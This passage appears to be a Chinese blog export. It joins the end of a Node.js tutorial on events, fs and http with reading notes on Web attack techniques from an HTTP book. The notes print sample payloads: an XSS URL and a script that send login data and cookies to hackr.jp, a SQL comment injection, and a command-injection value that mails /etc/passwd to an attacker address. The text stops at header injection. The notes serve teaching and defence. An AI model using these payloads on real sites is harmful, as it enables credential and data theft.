还提供了 util.isArray() 、 util.isRegExp() 、util.isDate() 、 util.isError() 四个类型测试工具，以及 util.format() 、 util.debug() 详情点击 事件驱动 eventsevents 是 Node.js 最重要的模块，没有“之一”，原因是 Node.js 本身架构就是事件式的，而它提供了唯一的接口，所以堪称 Node.js 事件编程的基石。 events 模块不仅用于用户代码与 Node.js 下层事件循环的交互，还几乎被所有的模块依赖。 事件发射器events 模块只提供了一个对象：event.EventEmitter。 EventEmitter 的核心就是事件发射与事件监听器功能的封装。 EventEmitter 的每个事件由一个事件名和若干参数组成，事件名是一个字符串，通常表达一定的语义。对于每一个事件，EventEmitter支持若干个事件监听器。当事件发射时，注册到这个事件的事件监听器被依次调用，事件参数作为回调函数参数传递。 例子： 1234567891011// eventsvar events = require('events');var emitter = new events.EventEmitter();emitter.on('someEvent', function(arg1, arg2)&#123; console.log('listener1', arg1, arg2);&#125;);emitter.on('someEvent', function(arg1, arg2)&#123; console.log('listener2', arg1, arg2);&#125;);emitter.emit('someEvent', 'lbh', 2018); 运行结果： 1234C:\Users\Administrator\Desktop\nodeJs&gt;node events.jslistener1 lbh 2018listener2 lbh 2018 以上例子，emitter 为事件 someEvent 注册了两个事件监听器，然后发射了 someEvent 事件。运行结果中可以看到两个事件监听器回调函数先被调用。 EventEmitter 常用的API。 EventEmitter.on(event, listener) 为指定事件注册一个监听器，接受一个字符串 event 和一个回调函数 listener EventEmitter.emit(event, [arg1], [arg2], [...]) 发射 event 事件，传递若干可选参数到事件监听器的参数表。 EventEmitter.once(event, listener) 为事件注册一个单次监听器，即监听器最多会触发一次，触发后就立刻解除该监听器 EventEmitter.removeListener(event, listener) 移除指定事件的某个监听器， listener 必须是该事件已经注册过的监听器。 EventEmitter.removeAllListeners([event]) 移除所有事件的所有监听器，如果指定 event，则移除指定事件的所有监听器。 更多详情点击 error 事件EventEmitter 定义了一个特殊的事件 error ，它包含了“错误”的语义，我们在遇到异常的时候通常会发射 error 事件。当 error 被发射时， EventEmitter 规定如果没有响应的监听器，Node.js 会把它当作异常，退出程序并打印调用栈。我们一般要为会发射 error 事件的对象设置监听器，避免遇到错误后整个程序崩溃。 继承 EventEmitter大多数时候我们不会直接使用 EventEmitter ，而是在对象中继承它。包括 fs 、 net 、http 在内的，只要是支持事件响应的核心模块都是 EventEmitter 的子类。 为什么要这样做呢？原因有两点。首先，具有某个实体功能的对象实现事件符合语义，事件的监听和发射应该是一个对象的方法。其次 JavaScript 的对象机制是基于原型的，支持部分多重继承，继承 EventEmitter 不会打乱对象原有的继承关系。 文件系统 fsfs 模块是文件操作的封装，它提供了文件的读取、写入、更名、删除、遍历目录、链接等 POSIX 文件系统操作。与其他模块不同的是，fs 模块中所有的操作都提供了异步的和同步的两个版本。例如读取文件内容的函数有异步的 fs.readFile() 和同步的 fs.readFileSync() fs.readFilefs.readFile(filename,[encoding],[callback(err,data)])是最简单的读取文件的函数。 fliename 必选参数，表示读取的文件名 encoding 可选，表示文件的字符编码 callback 回调函数提供两个参数 err 和 data，err表示有没有错发生， data 是文件内容。如果指定了 encoding,data 是一个解析后的字符串，否则 data 将会是以 Buffer 形式表示的二进制数据。 下面的例子读取文本内容，但是不指定编码 123456789// fs.readFilevar fs = require('fs');fs.readFile('content.txt',function(err, data)&#123; if(err)&#123; console.log(err); &#125;else &#123; console.log(data); &#125;&#125;); 运行结果： 12C:\Users\Administrator\Desktop\nodeJs&gt;node fs.readFile.js&lt;Buffer 54 65 78 74 20 e6 96 87 e6 9c ac e6 96 87 e4 bb b6 e7 a4 ba e4 be 8b&gt; 这个程序以二进制的模式读取了文件的内容， data 的值是 Buffer 的对象。如果指定了 encoding 指定编码 123456789// fs.readFilevar fs = require('fs');fs.readFile('content.txt','utf-8',function(err, data)&#123; if(err)&#123; console.log(err); &#125;else &#123; console.log(data); &#125;&#125;); 运行结果 12C:\Users\Administrator\Desktop\nodeJs&gt;node fs.readFile.jsText 文本文件示例 当读取文件出现错误时， err 将会是 Error 对象。如果 content.text 不存在，运行前面的代码则会出现以下结果： 1234567C:\Users\Administrator\Desktop\nodeJs&gt;node fs.readFile.js&#123; Error: ENOENT: no such file or directory, open 'C:\Users\Administrator\Desktop\nodeJs\content.text' errno: -4058, code: 'ENOENT', syscall: 'open', path: 'C:\\Users\\Administrator\\Desktop\\nodeJs\\content.text' &#125; Node.js 的异步编程接口习惯是以函数的最后一个参数为回调函数，通常一个函数只有一个回调函数。回调函数是实际参数中第一个是 err ，其余的参数是其他返回的内容。如果没有发生错误， err 的值会是 null 或 undefined 。如果有错误发生， err 通常是 Error 对象的实例。 fs.readFileSyncfs.readFileSync(filename, [encoding]) 是 fs.readFile 同步版本。它接受的参数和 fs.readFile 相同，而读取到的文件内容会以函数返回值的形式返回。如果有错误发生， fs 将会抛出异常，你需要使用 try 和 catch 捕捉并处理异常。 与同步 I/O 函数不同，Node.js 中异步函数大多没有返回值。 fs.openfs.open(path, flags, [mode], [callback(err, fd)]) 是 POSIX open 函数的封装，与 C 语言标准库中的 fopen 函数类似。它接受两个必选参数， path 为文件的路径，flags 可以是以下值。 r ：以读取模式打开文件。 r+ ：以读写模式打开文件。 w ：以写入模式打开文件，如果文件不存在则创建。 w+ ：以读写模式打开文件，如果文件不存在则创建。 a ：以追加模式打开文件，如果文件不存在则创建。 a+ ：以读取追加模式打开文件，如果文件不存在则创建。 mode 参数用于创建文件时给文件指定权限，默认是 0666。回调函数将会传递一个文件描述符 fd。 fs.readfs.read(fd, buffer, offset, length, position, [callback(err, bytesRead, buffer)]) 是 POSIX read 函数的封装，相比 fs.readFile 提供了更底层的接口。 fs.read的功能是从指定的文件描述符 fd 中读取数据并写入 buffer 指向的缓冲区对象。 offset 是 buffer 的写入偏移量。 length 是要从文件中读取的字节数。 position 是文件读取的起始位置，如果 position 的值为 null ，则会从当前文件指针的位置读取。 callback 回调函数传递 bytesRead 和 buffer ，分别表示读取的字节数和缓冲区对象。 以下是一个使用 fs.open 和 fs.read 的示例。 1234567891011121314151617// fs.readvar fs = require('fs');fs.open('content.txt', 'r', function(err, fd) &#123; if (err) &#123; console.log(err); return; &#125; var buf = new Buffer(8); fs.read(fd, buf, 0, 8, null, function(err, bytesRead, buffer) &#123; if (err) &#123; console.log(err); return; &#125; console.log('bytesRead:' + bytesRead); console.log(buffer); &#125;)&#125;); 运行结果： 123C:\Users\Administrator\Desktop\nodeJs&gt;node fs.read.jsbytesRead:8&lt;Buffer 54 65 78 74 20 e6 96 87&gt; 一般来说，除非必要，否则不要使用这种方式读取文件，因为它要求你手动管理缓冲区和文件指针，尤其是在你不知道文件大小的时候，这将会是一件很麻烦的事情 下表列出了 fs 所有函数的定义和功能 功 能 异步函数 同步函数 打开文件 fs.open(path,flags, [mode], [callback(err,fd)]) fs.openSync(path, flags, [mode]) 关闭文件 fs.close(fd, [callback(err)]) fs.closeSync(fd) 读取文件（文件描述符） fs.read(fd,buffer,offset,length,position,[callback(err, bytesRead, buffer)]) fs.readSync(fd, buffer, offset,length, position) 写入文件（文件描述符） fs.write(fd,buffer,offset,length,position,[callback(err, bytesWritten, buffer)]) fs.writeSync(fd, buffer, offset,length, position) 读取文件内容 fs.readFile(filename,[encoding],[callback(err, data)]) fs.readFileSync(filename,[encoding]) 写入文件内容 fs.writeFile(filename, data,[encoding],[callback(err)]) fs.writeFileSync(filename, data,[encoding]) 删除文件 fs.unlink(path, [callback(err)]) fs.unlinkSync(path) 创建目录 fs.mkdir(path, [mode], [callback(err)]) fs.mkdirSync(path, [mode]) 删除目录 fs.rmdir(path, [callback(err)]) fs.rmdirSync(path) 读取目录 fs.readdir(path, [callback(err, files)]) fs.readdirSync(path) 获取真实路径 fs.realpath(path, [callback(err,resolvedPath)]) fs.realpathSync(path) 更名 fs.rename(path1, path2, [callback(err)]) fs.renameSync(path1, path2) 截断 fs.truncate(fd, len, [callback(err)]) fs.truncateSync(fd, len) 更改所有权 fs.chown(path, uid, gid, [callback(err)]) fs.chownSync(path, uid, gid) 更改所有权（文件描述符） fs.fchown(fd, uid, gid, [callback(err)]) fs.fchownSync(fd, uid, gid) 更改所有权（不解析符号链接） fs.lchown(path, uid, gid, [callback(err)]) fs.lchownSync(path, uid, gid) 更改权限 fs.chmod(path, mode, [callback(err)]) fs.chmodSync(path, mode) 获取文件信息 fs.stat(path, [callback(err, stats)]) fs.statSync(path) 创建硬链接 fs.link(srcpath, dstpath, [callback(err)]) fs.linkSync(srcpath, dstpath) 创建符号链接 fs.symlink(linkdata, path, [type],[callback(err)]) fs.symlinkSync(linkdata, path,[type]) 读取链接 fs.readlink(path, [callback(err,linkString)]) fs.readlinkSync(path) 修改文件时间戳 fs.utimes(path, atime, mtime, [callback(err)]) fs.utimesSync(path, atime, mtime) 同步磁盘缓存 fs.fsync(fd, [callback(err)]) fs.fsyncSync(fd) HTTP 服务器与客户端Node.js 标准库提供了 http 模块，其中封装了一个高效的 HTTP 服务器和一个建议的 HTTP 客户端。http.server 是一个基于事件的 HTTP 服务器，它的核心由 Node.js 下层 C++ 部分实现，而接口由 JavaScript 封装，兼顾了高性能与简易性。 http.request 则是一个 HTTP 客户端工具，用于向 HTTP 服务器发起请求，例如实现内容抓取。 HTTP 服务器http.Server 是 http 模块中的 HTTP 服务器对象，用 Node.js 做的所有基于 HTTP 协议的系统，如网站、社交应用甚至代理服务器，都是基于 http.Server 实现的。它提供了一套封装级别很低的 API，仅仅是流控制和简单的消息解析，所有的高层功能都要通过它的接口来实现。 http 服务器的实现在上一节有实现过 1234567891011// app.jsvar http = require('http');http.createServer(function(req, res) &#123; res.writeHead(200, &#123; 'Content-Type': 'text/html' &#125;); res.write('&lt;h1&gt;Node.js&lt;/h1&gt;'); res.end('&lt;p&gt;Hello World&lt;/p&gt;');&#125;).listen(3000);console.log("HTTP server is listening at port 3000."); 这段代码中，http.createServer 创建了一个 http.Server 的实例，讲一个函数作为 HTTP 请求处理函数，这个函数接受两个参数，分别是请求对象（req）和响应对象（res）。在函数内，res 显式地写回了 响应代码 200（表示请求成功），指定了响应头为 Content-type：text/html，然后还写入了响应体&lt;h1&gt;Node.js&lt;/h1&gt;通过 res.end 结束并发送。最后该实例还调用了 listen 函数，启动服务器并监听 3000 端口。 http.Server 的事件http.Server 是一个基于事件的 HTTP 服务器，所有请求都被封装为独立的事件，开发者只需要对它的事件编写响应函数即可实现 HTTP 服务器的所有功能。它继承自 EventEmitter，提供了一下几个事件。 request ：当客户端请求到来时，该事件被触发，提供两个参数 res 和 req ，分别是 http.ServerRequest 和 http.ServerResponse 的实例，表示请求和响应信息。 connection : 当 TCP 连接建立时，该事件被触发，提供一个参数 socket ，为 net.Socket 的实例。 connection 事件的粒度要大于 request ，因为客户端在 Keep-alive 模式下可能会同一个连接内发送多次请求。 close : 当服务器关闭时，该事件被触发。注意不是在用户连接断开时。 除此之外还有 checkContinue 、 upgrade 、 clientError 事件，通常我们不需要关心，只有在实现复杂的 HTTP 服务器的时候才会用到。 在这些事件中，最常用的就是 request 了，因此 http 提供了一个捷径：http.createServer([requestListener]) ，功能是创建一个 HTTP 服务器并将requestListener 作为 request 事件的监听函数，这也是我们前面例子中使用的方法。事实上它显式的实现方法是： 12345678910111213// httpserver.jsvar http = require('http');var server = new http.Server();server.on('request', function(req, res) &#123; res.writeHead('200', &#123; 'Content-Type': 'text/html' &#125;); res.write('&lt;h1&gt;Node.js&lt;/h1&gt;'); res.end('&lt;p&gt;Hello World&lt;/p&gt;');&#125;);server.listen(3000);console.log("HTTP server is listening at port 3000."); http.ServerRequesthttp.ServerRequest是 HTTP 请求的信息，一般有 http.Server 的 request 事件发送，作为第一个参数传递，通常简称为 request 和 req。ServerRequest 提供一些属性。 data : 当请求体数据到来时，该事件被触发。该事件提供一个参数 chunk，表示接收到的数据，如果该事件没有被监听，那么请求体没有被监听，那么请求体就将会被抛弃，该事件可能会调用多次。 end ： 当请求体数据传输完成时，该事件被触发，此后将不会再有数据到来。 close ： 用户当前请求结束时，该事件被触发。不同于 end，如果用户强制终止了传输，也还是会调用 close。 名称 含义 complete 客户端请求是否已经发送完成 httpVersion HTTP 协议版本，通常是1.0 或是1.1 method HTTP 请求方法，如 GET、POST、PUT、DELETE 等 url 原始的请求路劲，例如/static/image/x.jpg headers HTTP 请求头 trailers HTTP 请求尾（不常见） connection 当前 HTTP 连接套接字，为 net.Socket 的实例 socket connection 属性的别名 client client 属性的别名 获取 GET 请求内容 http.ServerRequest 提供的属性里面没有类似 PHP 语言中的 $_GET 或$_POST 的属性，那我们如何接受客户端的表单请求呢？由于 GET 请求直接被嵌入在路径中，URL是完整的请求路径，包括了 ? 后面的部分，因此你可以手动解析后面的内容作为 GET请求的参数。Node.js 的 url 模块中的 parse 函数提供了这个功能，例如： 1234567891011// httpserverrequestget.jsvar http = require('http');var url = require('url');var util = require('util');http.createServer(function(req, res) &#123; res.writeHead(200, &#123; 'Content-Type': 'text/plain' &#125;); res.end(util.inspect(url.parse(req.url, true)));&#125;).listen(3000); 在浏览器中访问 http://127.0.0.1:3000/user?name=lbh&amp;email=544289495@qq.com 可以看到浏览器返回的结果： 12345678910111213Url &#123; protocol: null, slashes: null, auth: null, host: null, port: null, hostname: null, hash: null, search: '?name=lbh&amp;email=544289495@qq.com', query: &#123; name: 'lbh', email: '544289495@qq.com' &#125;, pathname: '/user', path: '/user?name=lbh&amp;email=544289495@qq.com', href: '/user?name=lbh&amp;email=544289495@qq.com' &#125; 可以看到， url.parse,原始的path被解析为一个对象，其中 query 就是我们所谓的 GET 请求的内容，而路径则是 pathname 。 获取 POST 请求内容HTTP 协议 1.1 版本提供了8种标准的请求方法，其中最常见的就是 GET 和 POST。相比GET 请求把所有的内容编码到访问路径中，POST 请求的内容全部都在请求体中。http.ServerRequest 并没有一个属性内容为请求体，原因是等待请求体传输可能是一件耗时的工作，譬如上传文件。而很多时候我们可能并不需要理会请求体的内容，恶意的 POST请求会大大消耗服务器的资源。所以 Node.js 默认是不会解析请求体的，当你需要的时候，需要手动来做。让我们看看实现方法： 1234567891011121314// httpserverrequestpost.jsvar http = require('http');var querystring = require('querystring');var util = require('util');http.createServer(function(req, res) &#123; var post = ''; req.on('data', function(chunk) &#123; post += chunk; &#125;); req.on('end', function() &#123; post = querystring.parse(post); res.end(util.inspect(post)); &#125;);&#125;).listen(3000); 上面代码并没有在请求响应函数中向客户端返回信息，而是定义了一个 post 变量，用于在闭包中暂存请求体的信息。通过 req 的 data 事件监听函数，每当接受到请求体的数据，就累加到 post 变量中。在 end 事件触发后，通过 querystring.parse 将 post 解析为真正的 POST 请求格式，然后向客户端返回。 http.ServerResponsehttp.ServerResponse 是返回给客户端的信息，决定了用户最终能看到的结果。它也是由 http.Server 的 request 事件发送的，作为第二个参数传递，一般简称为 response 或 res 。http.ServerResponse 有三个重要的成员函数，用于返回响应头、响应内容以及结束请求。 response.writeHead(statusCode, [headers]) 向请求的客户端发送响应头。 statusCode是 HTTP 状态码，如200/404等 headers 是一个类似关联数组的对象，表示响应头的每个属性，该函数在一个请求内最多只能调用一次，如果不调用，则会自动生成一个响应头。 response.write(data, [encoding]) 向请求的客户端发送响应内容。 data 是一个 Buffer或字符串，表示要发送的内容。如果 data是字符串，那么需要指定 encoding来说明它的编码方式，默认是 utf-8。如果在 response.end 调用之前， response.write 可以多次调用。 response.end([data], [encoding]) 结束响应，告知客户端所有发送已经完成。当所有要返回的内容发送完毕的时候，该函数 必须 被调用一次。它接受两个可选参数，意义和 response.write 相同。如果不调用该函数，客户端将永远处于等待状态。 HTTP 客户端http 模块提供了两个函数 http.request 和 http.get ，功能是作为客户端向 HTTP服务器发起请求。 http.request(options, callback)发起 HTTP 请求，接受两个参数，option是一个类似关联数组的对象，表示请求的参数， callback 是请求回调的函数。 option常见的参数如下。 host ：请求网站的域名或 IP 地址。 port：请求网站的端口 method：请求方法，默认GET path：请求的相对于根的路径，默认是“/”。 QueryString 应该包含在其中。例如 /search?query=lbh。 headers：一个关联数组对象，为请求头的内容。 callback 传递一个参数，为 http.ClientResponse 的实例。 http.request 返回一个 http.ClientRequest 的实例。 下面是一个通过 http.request 发送 POST 请求的代码： 123456789101112131415161718192021222324252627// httprequest.jsvar http = require('http');var querystring = require('querystring');var contents = querystring.stringify(&#123; name: 'lbh', email: '544289495@qq.com', address: 'xxx xx xxx'&#125;)var options = &#123; host: 'www.xxx.com', path: '/application/node/post.php', method: 'POST', headers: &#123; 'Content-Type': 'application/x-www-form-urlencoded', 'Content-Length': contents.length &#125;&#125;var req = http.request(options, function(res) &#123; res.setEncoding('utf-8'); res.on('data', function(data) &#123; console.log(data); &#125;);&#125;)req.write(contents);req.end(); // 不要忘了通过 req.end() 结束请求，否则服务器将不会收到信息。 http.get(options, callback) http模块还提供了一个更加简便的方法用于处理GET 请求： http.get。它是 http.request的简化版，唯一区别在于 http.get自动将请求方法设为了GET请求，同时不需要手动调用 req.end() 12345678910// httpget.jsvar http = require('http');http.get(&#123; host: 'www.xxx.com'&#125;, function(res) &#123; res.setEncoding('utf8'); res.on('data', function(data) &#123; console.log(data); &#125;);&#125;); http.ClientRequesthttp.ClientRequest 是由 http.request 或 http.get 返回产生的对象，表示一个已经产生而且正在进行中的 HTTP 请求。它提供一个 response 事件，即 http.request或 http.get 第二个参数指定的回调函数的绑定对象。我们也可以显式地绑定这个事件的监听函数： 123456789101112// httpresponse.jsvar http = require('http');var req = http.get(&#123; host: 'www.xxx.com'&#125;);req.on('response', function(res) &#123; res.setEncoding('utf8'); res.on('data', function(data) &#123; console.log(data); &#125;);&#125;); http.ClientRequest 像 http.ServerResponse 一样也提供了 write 和 end 函数，用于向服务器发送请求体，通常用于 POST、PUT 等操作。所有写结束以后必须调用 end函数以通知服务器，否则请求无效。 http.ClientRequest 还提供了以下函数。 request.abort() ：终止正在发送的请求。 request.setTimeout(timeout, [callback]) ：设置请求超时时间， timeout 为毫秒数。当请求超时以后， callback 将会被调用。 此外还有 request.setNoDelay([noDelay]) 、 request.setSocketKeepAlive([enable] , [initialDelay]) 等函数，具体内容请参见 Node.js 文档。 http.ClientResponsehttp.ClientResponse 与 http.ServerRequest 相似，提供了三个事件 data 、 end 和 close ，分别在数据到达、传输结束和连接结束时触发，其中 data 事件传递一个参数 chunk ，表示接收到的数据。 http.ClientResponse 也提供了一些属性，用于表示请求的结果状态,如下表 名 称 含 义 statusCode HTTP 状态码，如 200、404、500 httpVersion HTTP 协议版本，通常是 1.0 或 1.1 headers HTTP 请求头 trailers HTTP 请求尾（不常见） http.ClientResponse 还提供了以下几个特殊的函数。 response.setEncoding([encoding]) ：设置默认的编码，当 data 事件被触发时，数据将会以 encoding 编码。默认值是 null ，即不编码，以 Buffer 的形式存储。常用编码为 utf8。 response.pause() ：暂停接收数据和发送事件，方便实现下载功能。 response.resume() ：从暂停的状态中恢复。]]></content>
      <categories>
        <category>Nodejs</category>
      </categories>
      <tags>
        <tag>Nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[深入浅出HTTP，从开始到放弃（第十一章）—— Web 的攻击技术]]></title>
    <url>%2F2018-09-18-read-%E5%9B%BE%E8%A7%A3HTTP-Part11.html</url>
    <content type="text"><![CDATA[不知不觉，已经到了这本书的最后一章了，这本书整体看下来，感觉挺通俗易懂的，就是其中一些标准有些过时，毕竟也是很久前的书籍。看完 http 相关的之后，后面的时间都拿来学习 nodeJs以及js数据结构算法相关的。在当当网开学季买的书，只开封了一本《枕边算法书》，《你不知道的javaScript》系列三本等待开封… 第十一章 Web 的攻击技术互联网上的攻击大都将 Web 站点作为目标。本章讲解具体有哪些攻击 Web 站点的手段，以及攻击会造成怎样的影响。 针对 Web 的攻击技术简单的 HTTP 协议本身并不存在安全性问题，因此协议本身几乎不会成为攻击的对象。应用 HTTP 协议的服务器和客户端，以及运行在服务器上的 Web 应用等资源才是攻击目标。 HTTP 不具备必要的安全功能现今的 Web 网站应用的 HTTP 协议的使用方式已发生了翻天覆地的变化。几乎现今所有的 Web 网站都会使用会话（session）管理、加密处理等安全性方面的功能，而 HTTP 协议内并不具备这些功能。从整体上看，HTTP 就是一个通用的单纯协议机制。因此它具备较多优势，但是在安全性方面则呈劣势。 就拿远程登录时会用到的 SSH 协议来说，SSH 具备协议级别的认证及会话管理等功能，HTTP 协议则没有。另外在架设 SSH 服务方面，任何人都可以轻易地创建安全等级高的服务，而 HTTP 即使已架设好服务器，但若想提供服务器基础上的 Web 应用，很多情况下都需要重新开发。 因此，开发者需要自行设计并开发认证及会话管理功能来满足 Web应用的安全。而自行设计就意味着会出现各种形形色色的实现。结果，安全等级并不完备，可仍在运作的 Web 应用背后却隐藏着各种容易被攻击者滥用的安全漏洞的 Bug。 在客户端即可篡改请求在 Web 应用中，从浏览器那接收到的 HTTP 请求的全部内容，都可以在客户端自由地变更、篡改。所以 Web 应用可能会接收到与预期数据不相同的内容。 在 HTTP 请求报文内加载攻击代码，就能发起对 Web 应用的攻击。通过 URL 查询字段或表单、HTTP 首部、Cookie 等途径把攻击代码传入，若这时 Web 应用存在安全漏洞，那内部信息就会遭到窃取，或被攻击者拿到管理权限。 针对 Web 应用的攻击模式对 Web 应用的攻击模式有以下两种。 以服务器为目标的主动攻击 主动攻击（active attack）是指攻击者通过直接访问 Web 应用，把攻击代码传入的攻击模式。由于该模式是直接针对服务器上的资源进行攻击，因此攻击者需要能够访问到那些资源。主动攻击模式里具有代表性的攻击是 SQL 注入攻击和 OS 命令注入攻击。 以服务器为目标的被动攻击 被动攻击（passive attack）是指利用圈套策略执行攻击代码的攻击模式。在被动攻击过程中，攻击者不直接对目标 Web 应用访问发起攻击。 被动攻击通常的攻击模式如下所示。 步骤 1： 攻击者诱使用户触发已设置好的陷阱，而陷阱会启动发送已嵌入攻击代码的 HTTP 请求。 步骤 2： 当用户不知不觉中招之后，用户的浏览器或邮件客户端就会触发这个陷阱。 步骤 3： 中招后的用户浏览器会把含有攻击代码的 HTTP 请求发送给作为攻击目标的 Web 应用，运行攻击代码。 步骤 4： 执行完攻击代码，存在安全漏洞的 Web 应用会成为攻击者的跳板，可能导致用户所持的 Cookie 等个人信息被窃取，登录状态中的用户权限遭恶意滥用等后果。 被动攻击模式中具有代表性的攻击是跨站脚本攻击和跨站点请求伪造。 另外还有利用用户的身份攻击企业内部网络 利用被动攻击，可发起对原本从互联网上无法直接访问的企业内网等网络的攻击。只要用户踏入攻击者预先设好的陷阱，在用户能够访问到的网络范围内，即使是企业内网也同样会受到攻击。 很多企业内网依然可以连接到互联网上，访问 Web 网站，或接收互联网发来的邮件。这样就可能给攻击者以可乘之机，诱导用户触发陷阱后对企业内网发动攻击。 因输出值转义不完全引发的安全漏洞实施 Web 应用的安全对策可大致分为以下两部分。 客户端的验证 Web 应用端（服务器端）的验证 输入值验证 输出值转义 多数情况下采用 JavaScript 在客户端验证数据。可是在客户端允许篡改数据或关闭 JavaScript，不适合将 JavaScript 验证作为安全的防范对策。保留客户端验证只是为了尽早地辨识输入错误，起到提高 UI体验的作用。 Web 应用端的输入值验证按 Web 应用内的处理则有可能被误认为是具有攻击性意义的代码。输入值验证通常是指检查是否是符合系统业务逻辑的数值或检查字符编码等预防对策。 从数据库或文件系统、HTML、邮件等输出 Web 应用处理的数据之际，针对输出做值转义处理是一项至关重要的安全策略。当输出值转义不完全时，会因触发攻击者传入的攻击代码，而给输出对象带来损害。 跨站脚本攻击跨站脚本攻击（Cross-Site Scripting，XSS）是指通过存在安全漏洞的Web 网站注册用户的浏览器内运行非法的 HTML 标签或 JavaScript 进行的一种攻击。动态创建的 HTML 部分有可能隐藏着安全漏洞。就这样，攻击者编写脚本设下陷阱，用户在自己的浏览器上运行时，一不小心就会受到被动攻击。 跨站脚本攻击有可能造成以下影响。 利用虚假输入表单骗取用户个人信息。 利用脚本窃取用户的 Cookie 值，被害者在不知情的情况下，帮助攻击者发送恶意请求。 显示伪造的文章或图片。 XSS 是攻击者利用预先设置的陷阱触发的被动攻击。 跨站脚本攻击属于被动攻击模式，因此攻击者会事先布置好用于攻击的陷阱。 下图网站通过地址栏中 URI 的查询字段指定 ID，即相当于在表单内自动填写字符串的功能。而就在这个地方，隐藏着可执行跨站脚本攻击的漏洞。 充分熟知此处漏洞特点的攻击者，于是就创建了下面这段嵌入恶意代码的 URL。并隐藏植入事先准备好的欺诈邮件中或 Web 页面内，诱使用户去点击该 URL。 1http://example.jp/login?ID=&gt;&lt;script&gt;var f=document.getElementById(login); f.action=http://hackr.jp/pwget; f.method=get;&lt;/script&gt;&lt;span s= 浏览器打开该 URI 后，直观感觉没有发生任何变化，但设置好的脚本却偷偷开始运行了。当用户在表单内输入 ID 和密码之后，就会直接发送到攻击者的网站（也就是 hackr.jp），导致个人登录信息被窃取。 之后，ID 及密码会传给该正规网站，而接下来仍然是按正常登录步骤，用户很难意识到自己的登录信息已遭泄露。 对用户 Cookie 的窃取攻击 除了在表单中设下圈套之外，下面那种恶意构造的脚本同样能够以跨站脚本攻击的方式，窃取到用户的 Cookie 信息。 1&lt;script src=http://hackr.jp/xss.js&gt;&lt;/script&gt; 该脚本内指定的 http://hackr.jp/xss.js 文件。即下面这段采用 JavaScript 编写的代码。 1234var content = escape(document.cookie);document.write("&lt;img src=http://hackr.jp/?");document.write(content);document.write("&gt;"); 在存在可跨站脚本攻击安全漏洞的 Web 应用上执行上面这段JavaScript 程序，即可访问到该 Web 应用所处域名下的 Cookie 信息。然 后这些信息会发送至攻击者的 Web 网站（http://hackr.jp/），记录在他的登录日志中。结果，攻击者就这样窃取到用户的 Cookie 信息了。 SQL 注入攻击会执行非法 SQL 的 SQL 注入攻击 SQL 注入（SQL Injection）是指针对 Web 应用使用的数据库，通过运行非法的 SQL 而产生的攻击。该安全隐患有可能引发极大的威胁，有时会直接导致个人信息及机密信息的泄露。 Web 应用通常都会用到数据库，当需要对数据库表内的数据进行检索或添加、删除等操作时，会使用 SQL 语句连接数据库进行特定的操作。如果在调用 SQL 语句的方式上存在疏漏，就有可能执行被恶意注入（Injection）非法 SQL 语句。 SQL 注入攻击有可能会造成以下等影响。 非法查看或篡改数据库内的数据 规避认证 执行和数据库服务器业务关联的程序等 何为 SQL SQL 是用来操作关系型数据库管理系统（Relational DataBaseManagement System，RDBMS）的数据库语言，可进行操作数据或定义数据等。RDBMS 中有名的数据库有 Oracle Database、Microsoft SQL Server、IBM DB2、MySQL 和 PostgreSQL 等。这些数据库系统都可以把 SQL 作为数据库语言使用。使用数据库的 Web 应用，通过某种方法将 SQL 语句传给RDBMS，再把 RDBMS 返回的结果灵活地使用在 Web 应用中。 1SELECT title,text FROM newsTbl WHERE id=123 SQL 注入攻击案例 URL 的查询字段已指定 q= 上野宣，这个值由 Web 应用传入到SQL 语句中，构成下方的 SQL 语句。 1SELECT * FROM bookTbl WHERE author = '上野宣' and flag = 1; 该 SQL 语句表示“从 bookTbl 表中，显示满足 author= 上野宣 and flag=1（可售）所在行的数据”。数据库内的 bookTbl 表记录着该购物网站的所有书籍信息。通过SQL 语句，将满足作者名（author）上野宣并且 flag 为 1 双重条件的条目取出，最后作为搜索结果显示出来 如果把上野宣改写成“上野宣’–”。 构成的 SQL 语句就变成“从数据库的 bookTbl 表中，显示满足author= 上野宣条件所在行的数据”，如下所示。 1SELECT * FROM bookTbl WHERE author ='上野宣' - -' and flag=1; SQL 语句中的 – 之后全视为注释。即，and flag=1 这个条件被自动忽略了。 结果跟 flag 的设定值无关，只取出满足 author=“上野宣”条件所在行的数据，这样连那些尚未出版的书籍也一并显示出来了。 本案例中的问题仅仅是把未出版书籍的条目也一同显示出来了。但实际发生 SQL 注入攻击时，很有可能会导致用户信息或结算内容等其他数据表的非法浏览及篡改，从而使用户遭受不同程度的损失。 OS 命令注入攻击OS 命令注入攻击（OS Command Injection）是指通过 Web 应用，执行非法的操作系统命令达到攻击的目的。只要在能调用 Shell 函数的地方就有存在被攻击的风险。 可以从 Web 应用中通过 Shell 来调用操作系统命令。倘若调用 Shell时存在疏漏，就可以执行插入的非法 OS 命令。 OS 命令注入攻击可以向 Shell 发送命令，让 Windows 或 Linux 操作系统的命令行启动程序。也就是说，通过 OS 注入攻击可执行 OS 上安装着的各种程序。 OS 注入攻击案例 下面以咨询表单的发送功能为例，讲解 OS 注入攻击。该功能可将用户的咨询邮件按已填写的对方邮箱地址发送过去。 下面摘选处理该表单内容的一部分核心代码。 123my $adr = $q-&gt;param('mailaddress');open(MAIL, "| /usr/sbin/sendmail $adr");print MAIL "From: info@example.com\n"; 程序中的 open 函数会调用 sendmail 命令发送邮件，而指定的邮件发送地址即 $adr 的值。攻击者将下面的值指定作为邮件地址。 1; cat /etc/passwd | mail hack@example.jp 程序接收该值，构成以下的命令组合。 1| /usr/sbin/sendmail ; cat /etc/passwd | mail hack@example.jp 攻击者的输入值中含有分号（;）。这个符号在 OS 命令中，会被解析为分隔多个执行命令的标记。 可见，sendmail 命令执行被分隔后，接下去就会执行 cat/etc/passwd | mail hack@example.jp 这样的命令了。结果，含有 Linux 账户信息 /etc/passwd 的文件，就以邮件形式发送给了 hack@example.jp。 HTTP 首部注入攻击HTTP 首部注入攻击（HTTP Header Injection）是指攻击者通过在响应首部字段内插入换行，添加任意响应首部或主体的一种攻击。属于被动攻击模式。 向首部主体内添加内容的攻击称为 HTTP 响应截断攻击（HTTP Response Splitting Attack）。 如下所示，Web 应用有时会把从外部接收到的数值，赋给响应首部字段 Location 和 Set-Cookie。 123Location: http://www.example.com/a.cgi?q=12345Set-Cookie: UID=12345＊12345就是插入值 HTTP 首部注入可能像这样，通过在某些响应首部字段需要处理输出值的地方，插入换行发动攻击。 HTTP 首部注入攻击有可能会造成以下一些影响。 设置任何 Cookie 信息 重定向至任意 URL 显示任意的主体（HTTP 响应截断攻击） HTTP 首部注入攻击案例 